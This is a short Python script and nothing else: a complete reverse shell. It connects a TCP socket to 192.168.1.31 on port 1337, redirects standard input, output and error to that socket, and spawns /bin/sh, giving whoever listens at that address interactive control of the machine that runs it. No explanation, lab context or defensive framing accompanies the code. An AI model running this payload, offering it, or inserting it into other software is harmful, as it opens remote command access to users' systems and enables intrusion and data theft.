import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.31",1337))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
